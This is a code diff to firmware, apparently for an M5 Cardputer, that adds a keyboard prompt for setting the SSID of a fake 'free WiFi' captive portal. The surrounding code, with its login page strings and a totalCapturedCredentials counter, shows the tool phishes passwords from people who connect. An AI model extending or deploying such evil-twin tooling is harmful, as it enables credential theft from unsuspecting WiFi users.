@@ -19,6 +19,7 @@
 #define LOGIN_MESSAGE "Please log in to browse securely."
 #define LOGIN_BUTTON "Next"
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
+#define TYPE_SSID_TEXT "Lenght between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #elif defined(LANGUAGE_PT_BR)
 #define DEFAULT_AP_SSID_NAME "WiFi Gratis"
 #define LOGIN_TITLE "Fazer login"
@@ -28,6 +29,7 @@
 #define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
+#define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
@@ -42,13 +44,6 @@ unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
 
-void setupWiFi() {
-  Serial.println("Initializing WiFi");
-  WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(apSsidName);
-}
-
 void setSSID(String ssid){
   #if defined USE_EEPROM
   Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
@@ -62,6 +57,61 @@ void setSSID(String ssid){
   #endif
   apSsidName=ssid;
   return;
+}
+
+void confirmOrTypeSSID(){
+  DISP.fillScreen(BLACK);
+  DISP.setSwapBytes(true);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.println("WiFi SSID");
+  DISP.setTextSize(TINY_TEXT);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println(TYPE_SSID_TEXT);
+  DISP.setTextSize(SMALL_TEXT);
+  uint8_t ssidTextCursorY = DISP.getCursorY();
+  String currentSSID = String(apSsidName.c_str());
+  DISP.printf("%s", currentSSID.c_str());
+  bool ssid_ok = false;
+
+  while(!ssid_ok){
+    M5Cardputer.update();
+    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
+      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+      if(status.del) {
+        currentSSID.remove(currentSSID.length() - 1);
+      }
+      if(status.enter) {
+        ssid_ok = true;
+      }
+      if(currentSSID.length() >= 32) {
+        continue;
+      }
+      for(auto i : status.word) {
+        if(i != '?' && i != '$' && i != '\"' && i != '[' && i != '\\' && i != ']' && i != '+'){
+          currentSSID += i;
+        }
+      }
+      DISP.fillRect(0, ssidTextCursorY, DISP.width(), DISP.width()- ssidTextCursorY, BLACK);
+      DISP.setCursor(0, ssidTextCursorY);
+      DISP.printf("%s", currentSSID.c_str());
+    }
+  }
+
+  if(currentSSID != apSsidName && currentSSID.length() > 2){
+    setSSID(currentSSID);
+  }
+}
+
+void setupWiFi() {
+  Serial.println("Initializing WiFi");
+  #if defined(CARDPUTER)
+  confirmOrTypeSSID();
+  #endif // Cardputer
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(apSsidName);
 }
 
 void getSSID(){
